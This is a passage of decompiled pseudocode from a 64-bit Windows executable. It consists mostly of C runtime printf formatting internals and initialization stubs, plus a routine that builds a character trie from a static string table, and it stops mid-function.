// 140147660: using guessed type wchar_t Str1[1024];

//----- (00000001400031A0) ----------------------------------------------------
_QWORD *sub_1400031A0()
{
  _QWORD *v0; // rbp
  char *v1; // r15
  char v2; // cl
  _QWORD *v3; // rsi
  char *v4; // r14
  int v5; // eax
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rdi
  _QWORD *v9; // rbx

  v0 = j__calloc_base(0x10ui64, 1ui64);
  *(_BYTE *)v0 = 0;
  v0[1] = j__calloc_base(0x240ui64, 1ui64);
  v1 = a0;
  do
  {
    v2 = *v1;
    v3 = v0;
    if ( *v1 )
    {
      v4 = v1;
      do
      {
        if ( (unsigned __int8)(v2 - 48) > 9u )
        {
          if ( (unsigned __int8)(v2 - 97) > 0x19u )
          {
            if ( (unsigned __int8)(v2 - 65) > 0x19u )
              goto LABEL_14;
            v5 = v2 - 55;
          }
          else
          {
            v5 = v2 - 87;
          }
        }
        else
        {
          v5 = v2 - 48;
        }
        v6 = v5;
        v7 = v3[1];
        v8 = 8 * v6;
        if ( !*(_QWORD *)(8 * v6 + v7) )
        {
          v9 = j__calloc_base(0x10ui64, 1ui64);
          *(_BYTE *)v9 = 0;
          v9[1] = j__calloc_base(0x240ui64, 1ui64);
          *(_QWORD *)(v8 + v3[1]) = v9;
          v7 = v3[1];
        }
        v2 = *++v4;
        v3 = *(_QWORD **)(v8 + v7);
      }
      while ( v2 );
    }
    *(_BYTE *)v3 = 1;
LABEL_14:
    v1 += 10;
  }
  while ( (__int64)v1 < (__int64)&unk_14013E9DE );
  return v0;
}

//----- (00000001400032D0) ----------------------------------------------------
void __fastcall sub_1400032D0(_QWORD *a1)
{
  __int64 i; // rbx
  char *v3; // rcx

  if ( a1 )
  {
    for ( i = 0i64; i < 288; i += 8i64 )
    {
      v3 = (char *)a1[1];
      if ( *(_QWORD *)&v3[i] )
      {
        sub_1400032D0(*(_QWORD *)&v3[i]);
        *(_QWORD *)(i + a1[1]) = 0i64;
        v3 = (char *)a1[1];
      }
    }
    j__free_base(v3);
    j__free_base(a1);
  }
}

//----- (0000000140003BF0) ----------------------------------------------------
__int64 __fastcall UserMathErrorFunction(struct _exception *a1)
{
  return 0i64;
}

//----- (0000000140003C10) ----------------------------------------------------
void sub_140003C10()
{
  InitializeSListHead(&stru_14013FBA0);
}
// 14013FBA0: using guessed type union _SLIST_HEADER stru_14013FBA0;

//----- (0000000140003C20) ----------------------------------------------------
char sub_140003C20()
{
  return 1;
}

//----- (0000000140003C34) ----------------------------------------------------
void *sub_140003C34()
{
  return &unk_14013FBB0;
}

//----- (0000000140003C64) ----------------------------------------------------
void *sub_140003C64()
{
  return &unk_140147E70;
}

//----- (0000000140003C6C) ----------------------------------------------------
void *sub_140003C6C()
{
  return &unk_140147E68;
}

//----- (0000000140003C74) ----------------------------------------------------
void sub_140003C74()
{
  dword_14013FBB8 = 0;
}
// 14013FBB8: using guessed type int dword_14013FBB8;

//----- (0000000140003E6C) ----------------------------------------------------
void sub_140003E6C()
{
  void (**i)(void); // rbx

  for ( i = qword_1401276D8; i < qword_1401276D8; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 1401276D8: using guessed type void (*qword_1401276D8[2])(void);

//----- (0000000140003EA8) ----------------------------------------------------
void __fastcall sub_140003EA8()
{
  void (**i)(void); // rbx

  for ( i = &qword_1401276E8; i < &qword_1401276E8; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 1401276E8: using guessed type void (*qword_1401276E8)(void);

//----- (00000001400052A0) ----------------------------------------------------
__int64 __fastcall sub_1400052A0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  void (__fastcall *v4)(__int64); // rax
  __int64 v5; // rax

  v4 = (void (__fastcall *)(__int64))NLG_Notify(a1, a2, a4);
  v4(a3);
  v5 = _NLG_Return2();
  return NLG_Notify(v5, a2, 2i64);
}
// 140004830: using guessed type __int64 __fastcall NLG_Notify(_QWORD, _QWORD, _QWORD);
// 140004860: using guessed type __int64 _NLG_Return2(void);

//----- (0000000140007BA8) ----------------------------------------------------
char __fastcall sub_140007BA8(__int64 a1)
{
  if ( (unsigned __int8)unknown_libname_9(a1, 0i64) )
  {
    if ( ((*(_DWORD *)(*(_QWORD *)(a1 + 1128) + 20i64) & 0x1000) == 0 || *(_QWORD *)(*(_QWORD *)(a1 + 1128) + 8i64))
      && (unsigned int)unknown_libname_27((unsigned int)*(char *)(a1 + 65), *(_QWORD *)(a1 + 1128)) == -1 )
    {
      *(_DWORD *)(a1 + 40) = -1;
    }
    else
    {
      ++*(_DWORD *)(a1 + 40);
    }
    return 1;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0;
  }
}
// 140007C8C: using guessed type __int64 __fastcall unknown_libname_9(_QWORD, _QWORD);
// 14001205C: using guessed type __int64 __fastcall unknown_libname_27(_QWORD, _QWORD);

//----- (0000000140007C18) ----------------------------------------------------
char __fastcall sub_140007C18(__int64 a1)
{
  __int64 v2; // rcx
  char v3; // r8

  if ( (unsigned __int8)unknown_libname_10(a1, 0i64) )
  {
    v2 = *(_QWORD *)(a1 + 1128);
    v3 = *(_BYTE *)(a1 + 65);
    if ( *(_QWORD *)(v2 + 16) == *(_QWORD *)(v2 + 8) )
    {
      if ( *(_BYTE *)(v2 + 24) )
        ++*(_DWORD *)(a1 + 40);
      else
        *(_DWORD *)(a1 + 40) = -1;
    }
    else
    {
      ++*(_DWORD *)(a1 + 40);
      ++*(_QWORD *)(v2 + 16);
      *(_BYTE *)(**(_QWORD **)(a1 + 1128))++ = v3;
    }
    return 1;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0;
  }
}
// 140007D20: using guessed type __int64 __fastcall unknown_libname_10(_QWORD, _QWORD);

//----- (0000000140007DB8) ----------------------------------------------------
char __fastcall sub_140007DB8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  char v4; // al
  char result; // al
  bool v6; // zf
  _BYTE *v7; // rax
  _BYTE *v8; // rax
  char *v9; // rdx
  char v10; // al
  unsigned __int8 v11; // al
  __int64 v12; // rdx

  v4 = *(_BYTE *)(a1 + 65);
  if ( v4 == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_1400083F8(a1, a2, a3, a4);
    }
    return 1;
  }
  if ( v4 == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) )
    goto LABEL_7;
  switch ( v4 )
  {
    case 'I':
      v9 = *(char **)(a1 + 24);
      v10 = *v9;
      if ( *v9 == 51 && v9[1] == 50 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else if ( v10 == 54 && v9[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else
      {
        v11 = v10 - 88;
        if ( v11 <= 0x20u )
        {
          v12 = 0x120821001i64;
          if ( _bittest64(&v12, (char)v11) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v8 = *(_BYTE **)(a1 + 24);
      if ( *v8 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v8 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v7 = *(_BYTE **)(a1 + 24);
      if ( *v7 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v7 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
  }
  v6 = v4 == 122;
  result = 1;
  if ( v6 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}

//----- (0000000140007F34) ----------------------------------------------------
char __fastcall sub_140007F34(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  char v4; // al
  char result; // al
  bool v6; // zf
  _BYTE *v7; // rax
  _BYTE *v8; // rax
  char *v9; // rdx
  char v10; // al
  unsigned __int8 v11; // al
  __int64 v12; // rdx

  v4 = *(_BYTE *)(a1 + 65);
  if ( v4 == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_140008674(a1, a2, a3, a4);
    }
    return 1;
  }
  if ( v4 == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) )
    goto LABEL_7;
  switch ( v4 )
  {
    case 'I':
      v9 = *(char **)(a1 + 24);
      v10 = *v9;
      if ( *v9 == 51 && v9[1] == 50 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else if ( v10 == 54 && v9[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else
      {
        v11 = v10 - 88;
        if ( v11 <= 0x20u )
        {
          v12 = 0x120821001i64;
          if ( _bittest64(&v12, (char)v11) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v8 = *(_BYTE **)(a1 + 24);
      if ( *v8 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v8 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v7 = *(_BYTE **)(a1 + 24);
      if ( *v7 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v7 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
  }
  v6 = v4 == 122;
  result = 1;
  if ( v6 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}

//----- (00000001400080B0) ----------------------------------------------------
char __fastcall sub_1400080B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  char result; // al
  int v5; // eax
  bool v6; // zf
  _WORD *v7; // rax
  _WORD *v8; // rax
  __int16 *v9; // rdx
  __int16 v10; // ax
  unsigned __int16 v11; // ax
  __int64 v12; // rdx

  if ( *(_WORD *)(a1 + 66) == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_1400088F0(a1, a2, a3, a4);
    }
    return 1;
  }
  if ( *(_WORD *)(a1 + 66) == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) )
    goto LABEL_7;
  v5 = *(unsigned __int16 *)(a1 + 66);
  switch ( v5 )
  {
    case 'I':
      v9 = *(__int16 **)(a1 + 24);
      v10 = *v9;
      if ( *(_DWORD *)v9 == 3276851 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else if ( v10 == 54 && v9[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else
      {
        v11 = v10 - 88;
        if ( v11 <= 0x20u )
        {
          v12 = 0x120821001i64;
          if ( _bittest64(&v12, v11) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v8 = *(_WORD **)(a1 + 24);
      if ( *v8 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v8 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v7 = *(_WORD **)(a1 + 24);
      if ( *v7 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v7 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
  }
  v6 = v5 == 122;
  result = 1;
  if ( v6 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}

//----- (0000000140008254) ----------------------------------------------------
char __fastcall sub_140008254(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  char result; // al
  int v5; // eax
  bool v6; // zf
  _WORD *v7; // rax
  _WORD *v8; // rax
  __int16 *v9; // rdx
  __int16 v10; // ax
  unsigned __int16 v11; // ax
  __int64 v12; // rdx

  if ( *(_WORD *)(a1 + 66) == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_140008BBC(a1, a2, a3, a4);
    }
    return 1;
  }
  if ( *(_WORD *)(a1 + 66) == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) )
    goto LABEL_7;
  v5 = *(unsigned __int16 *)(a1 + 66);
  switch ( v5 )
  {
    case 'I':
      v9 = *(__int16 **)(a1 + 24);
      v10 = *v9;
      if ( *(_DWORD *)v9 == 3276851 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else if ( v10 == 54 && v9[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v9 + 2;
      }
      else
      {
        v11 = v10 - 88;
        if ( v11 <= 0x20u )
        {
          v12 = 0x120821001i64;
          if ( _bittest64(&v12, v11) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v8 = *(_WORD **)(a1 + 24);
      if ( *v8 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v8 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v7 = *(_WORD **)(a1 + 24);
      if ( *v7 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v7 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
  }
  v6 = v5 == 122;
  result = 1;
  if ( v6 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}

//----- (00000001400083F8) ----------------------------------------------------
char __fastcall sub_1400083F8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v4; // eax
  __int64 v5; // rbx
  char v6; // al
  unsigned int v7; // edx
  char v8; // r8
  int v9; // ecx
  __int64 v11; // rdx
  __int64 v12; // rdi
  char v13; // cl
  bool v14; // r8
  bool v15; // al
  unsigned int v16; // esi
  __int64 v17; // rdx
  int v18; // ecx
  __int64 v19; // rdx
  __int16 v20; // [rsp+50h] [rbp+8h] BYREF
  char v21; // [rsp+52h] [rbp+Ah]

  v4 = *(char *)(a1 + 65);
  v5 = a1;
  if ( v4 > 100 )
  {
    if ( v4 <= 103 )
      goto LABEL_34;
    if ( v4 != 105 )
    {
      switch ( v4 )
      {
        case 'n':
          v6 = unknown_libname_17();
          goto LABEL_35;
        case 'o':
          v9 = *(_DWORD *)(a1 + 48);
          if ( (v9 & 0x20) != 0 )
            *(_DWORD *)(v5 + 48) = v9 | 0x80;
          v7 = 8;
          a1 = v5;
          goto LABEL_32;
        case 'p':
          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          v8 = 1;
          v7 = 16;
LABEL_33:
          v6 = sub_140009544(a1, v7, v8, a4);
          goto LABEL_35;
        case 's':
LABEL_23:
          v6 = unknown_libname_18();
          goto LABEL_35;
      }
      if ( v4 != 117 )
      {
        if ( v4 != 120 )
          return 0;
        v7 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v7 = 10;
LABEL_32:
      v8 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v4 == 100 )
    goto LABEL_30;
  if ( v4 != 65 )
  {
    if ( v4 == 67 )
    {
LABEL_12:
      v6 = unknown_libname_15(a1, 0i64);
      goto LABEL_35;
    }
    if ( v4 <= 68 )
      return 0;
    if ( v4 > 71 )
    {
      if ( v4 != 83 )
      {
        if ( v4 != 88 )
        {
          if ( v4 == 90 )
          {
            v6 = unknown_libname_11();
            goto LABEL_35;
          }
          if ( v4 != 97 )
          {
            if ( v4 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v6 = unknown_libname_13();
LABEL_35:
  if ( !v6 )
    return 0;
  if ( !*(_BYTE *)(v5 + 64) )
  {
    v11 = *(unsigned int *)(v5 + 48);
    v20 = 0;
    v12 = 0i64;
    v21 = 0;
    if ( (v11 & 0x10) == 0 )
      goto LABEL_46;
    if ( (v11 & 0x40) != 0 )
    {
      LOBYTE(v20) = 45;
    }
    else if ( (v11 & 1) != 0 )
    {
      LOBYTE(v20) = 43;
    }
    else
    {
      if ( (v11 & 2) == 0 )
        goto LABEL_46;
      LOBYTE(v20) = 32;
    }
    v12 = 1i64;
LABEL_46:
    v13 = *(_BYTE *)(v5 + 65);
    v14 = ((v13 - 88) & 0xDF) == 0 && (v11 & 0x20) != 0;
    if ( v14 || ((v13 - 65) & 0xDF) == 0 )
    {
      *((_BYTE *)&v20 + v12++) = 48;
      v15 = v13 == 88 || v13 == 65;
      *((_BYTE *)&v20 + v12) = v15 ? 88 : 120;
      LODWORD(v12) = v12 + 1;
    }
    v16 = *(_DWORD *)(v5 + 52) - *(_DWORD *)(v5 + 80) - v12;
    if ( (v11 & 0xC) == 0 )
    {
      LOBYTE(v11) = 32;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
        v5 + 1128,
        v11,
        v16,
        v5 + 40);
    }
    __crt_stdio_output::stream_output_adapter<char>::write_string(
      v5 + 1128,
      (unsigned int)&v20,
      v12,
      v5 + 40,
      *(_QWORD *)(v5 + 16));
    v18 = *(_DWORD *)(v5 + 48);
    if ( (v18 & 8) != 0 && (v18 & 4) == 0 )
    {
      LOBYTE(v17) = 48;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
        v5 + 1128,
        v17,
        v16,
        v5 + 40);
    }
    unknown_libname_20(v5, 0i64);
    if ( *(int *)(v5 + 40) >= 0 && (*(_DWORD *)(v5 + 48) & 4) != 0 )
    {
      LOBYTE(v19) = 32;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(
        v5 + 1128,
        v19,
        v16,
        v5 + 40);
    }
  }
  return 1;
}
// 140008625: variable 'v17' is possibly undefined
// 140008650: variable 'v19' is possibly undefined
// 140006C70: using guessed type __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(_QWORD, _QWORD, _QWORD, _QWORD);
// 140008E88: using guessed type __int64 unknown_libname_11(void);
// 140008F88: using guessed type __int64 unknown_libname_13(void);
// 1400093E8: using guessed type __int64 __fastcall unknown_libname_15(_QWORD, _QWORD);
// 1400096E4: using guessed type __int64 unknown_libname_17(void);
// 1400097C0: using guessed type __int64 unknown_libname_18(void);
// 1400099A4: using guessed type __int64 __fastcall unknown_libname_20(_QWORD, _QWORD);
// 140009D30: using guessed type __int64 __fastcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64);

//----- (0000000140008674) ----------------------------------------------------
char __fastcall sub_140008674(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v4; // eax
  __int64 v5; // rbx
  char v6; // al
  unsigned int v7; // edx
  char v8; // r8
  int v9; // ecx
  __int64 v11; // rdx
  __int64 v12; // rdi
  char v13; // cl
  bool v14; // r8
  bool v15; // al
  unsigned int v16; // esi
  __int64 v17; // rdx
  int v18; // ecx
  __int64 v19; // rdx
  __int16 v20; // [rsp+50h] [rbp+8h] BYREF
  char v21; // [rsp+52h] [rbp+Ah]

  v4 = *(char *)(a1 + 65);
  v5 = a1;
  if ( v4 > 100 )
  {
    if ( v4 <= 103 )
      goto LABEL_34;
    if ( v4 != 105 )
    {
      switch ( v4 )
      {
        case 'n':
          v6 = unknown_libname_17();
          goto LABEL_35;
        case 'o':
          v9 = *(_DWORD *)(a1 + 48);
          if ( (v9 & 0x20) != 0 )
            *(_DWORD *)(v5 + 48) = v9 | 0x80;
          v7 = 8;
          a1 = v5;
          goto LABEL_32;
        case 'p':
          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          v8 = 1;
          v7 = 16;
LABEL_33:
          v6 = sub_140009544(a1, v7, v8, a4);
          goto LABEL_35;
        case 's':
LABEL_23:
          v6 = unknown_libname_18();
          goto LABEL_35;
      }
      if ( v4 != 117 )
      {
        if ( v4 != 120 )
          return 0;
        v7 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v7 = 10;
LABEL_32:
      v8 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v4 == 100 )
    goto LABEL_30;
  if ( v4 != 65 )
  {
    if ( v4 == 67 )
    {
LABEL_12:
      v6 = unknown_libname_15(a1, 0i64);
      goto LABEL_35;
    }
    if ( v4 <= 68 )
      return 0;
    if ( v4 > 71 )
    {
      if ( v4 != 83 )
      {
        if ( v4 != 88 )
        {
          if ( v4 == 90 )
          {
            v6 = unknown_libname_11();
            goto LABEL_35;
          }
          if ( v4 != 97 )
          {
            if ( v4 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v6 = unknown_libname_13();
LABEL_35:
  if ( !v6 )
    return 0;
  if ( !*(_BYTE *)(v5 + 64) )
  {
    v11 = *(unsigned int *)(v5 + 48);
    v20 = 0;
    v12 = 0i64;
    v21 = 0;
    if ( (v11 & 0x10) == 0 )
      goto LABEL_46;
    if ( (v11 & 0x40) != 0 )
    {
      LOBYTE(v20) = 45;
    }
    else if ( (v11 & 1) != 0 )
    {
      LOBYTE(v20) = 43;
    }
    else
    {
      if ( (v11 & 2) == 0 )
        goto LABEL_46;
      LOBYTE(v20) = 32;
    }
    v12 = 1i64;
LABEL_46:
    v13 = *(_BYTE *)(v5 + 65);
    v14 = ((v13 - 88) & 0xDF) == 0 && (v11 & 0x20) != 0;
    if ( v14 || ((v13 - 65) & 0xDF) == 0 )
    {
      *((_BYTE *)&v20 + v12++) = 48;
      v15 = v13 == 88 || v13 == 65;
      *((_BYTE *)&v20 + v12) = v15 ? 88 : 120;
      LODWORD(v12) = v12 + 1;
    }
    v16 = *(_DWORD *)(v5 + 52) - *(_DWORD *)(v5 + 80) - v12;
    if ( (v11 & 0xC) == 0 )
    {
      LOBYTE(v11) = 32;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        v5 + 1128,
        v11,
        v16,
        v5 + 40);
    }
    __crt_stdio_output::string_output_adapter<char>::write_string(
      v5 + 1128,
      (unsigned int)&v20,
      v12,
      v5 + 40,
      *(_QWORD *)(v5 + 16));
    v18 = *(_DWORD *)(v5 + 48);
    if ( (v18 & 8) != 0 && (v18 & 4) == 0 )
    {
      LOBYTE(v17) = 48;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        v5 + 1128,
        v17,
        v16,
        v5 + 40);
    }
    unknown_libname_21(v5, 0i64);
    if ( *(int *)(v5 + 40) >= 0 && (*(_DWORD *)(v5 + 48) & 4) != 0 )
    {
      LOBYTE(v19) = 32;
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        v5 + 1128,
        v19,
        v16,
        v5 + 40);
    }
  }
  return 1;
}
// 1400088A1: variable 'v17' is possibly undefined
// 1400088CC: variable 'v19' is possibly undefined
// 140006D84: using guessed type __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_QWORD, _QWORD, _QWORD, _QWORD);
// 140008E88: using guessed type __int64 unknown_libname_11(void);
// 140008F88: using guessed type __int64 unknown_libname_13(void);
// 1400093E8: using guessed type __int64 __fastcall unknown_libname_15(_QWORD, _QWORD);
// 1400096E4: using guessed type __int64 unknown_libname_17(void);
// 1400097C0: using guessed type __int64 unknown_libname_18(void);
// 140009A7C: using guessed type __int64 __fastcall unknown_libname_21(_QWORD, _QWORD);
// 140009F34: using guessed type __int64 __fastcall __crt_stdio_output::string_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64);

//----- (00000001400088F0) ----------------------------------------------------
char __fastcall sub_1400088F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // eax
  __int64 v5; // rbx
  char v6; // al
  unsigned int v7; // edx
  char v8; // r8
  int v9; // ecx
  __int64 v11; // rdx
  __int64 v12; // rdi
  __int16 v13; // ax
  __int16 v14; // cx
  bool v15; // r8
  bool v16; // al
  unsigned int v17; // esi
  __int64 v18; // rdx
  int v19; // ecx
  __int64 v20; // rdx
  int v21; // [rsp+30h] [rbp-38h] BYREF
  __int16 v22; // [rsp+34h] [rbp-34h]

  v4 = *(unsigned __int16 *)(a1 + 66);
  v5 = a1;
  if ( v4 > 0x64 )
  {
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x67u )
      goto LABEL_34;
    if ( v4 != 105 )
    {
      switch ( v4 )
      {
        case 'n':
          v6 = unknown_libname_17();
          goto LABEL_35;
        case 'o':
          v9 = *(_DWORD *)(a1 + 48);
          if ( (v9 & 0x20) != 0 )
            *(_DWORD *)(v5 + 48) = v9 | 0x80;
          v7 = 8;
          a1 = v5;
          goto LABEL_32;
        case 'p':
          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          v8 = 1;
          v7 = 16;
LABEL_33:
          v6 = sub_140009544(a1, v7, v8, a4);
          goto LABEL_35;
        case 's':
LABEL_23:
          v6 = unknown_libname_19();
          goto LABEL_35;
      }
      if ( v4 != 117 )
      {
        if ( v4 != 120 )
          return 0;
        v7 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v7 = 10;
LABEL_32:
      v8 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v4 == 100 )
    goto LABEL_30;
  if ( v4 != 65 )
  {
    if ( v4 == 67 )
    {
LABEL_12:
      v6 = unknown_libname_16(a1, 0i64);
      goto LABEL_35;
    }
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x44u )
      return 0;
    if ( *(unsigned __int16 *)(a1 + 66) > 0x47u )
    {
      if ( v4 != 83 )
      {
        if ( v4 != 88 )
        {
          if ( v4 == 90 )
          {
            v6 = unknown_libname_12();
            goto LABEL_35;
          }
          if ( v4 != 97 )
          {
            if ( v4 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v6 = unknown_libname_14();
LABEL_35:
  if ( !v6 )
    return 0;
  if ( !*(_BYTE *)(v5 + 64) )
  {
    v11 = *(unsigned int *)(v5 + 48);
    v21 = 0;
    v12 = 0i64;
    v22 = 0;
    if ( (v11 & 0x10) == 0 )
      goto LABEL_47;
    if ( (v11 & 0x40) != 0 )
    {
      v13 = 45;
    }
    else
    {
      if ( (v11 & 1) == 0 )
      {
        if ( (v11 & 2) == 0 )
          goto LABEL_47;
        LOWORD(v21) = 32;
LABEL_46:
        v12 = 1i64;
LABEL_47:
        v14 = *(_WORD *)(v5 + 66);
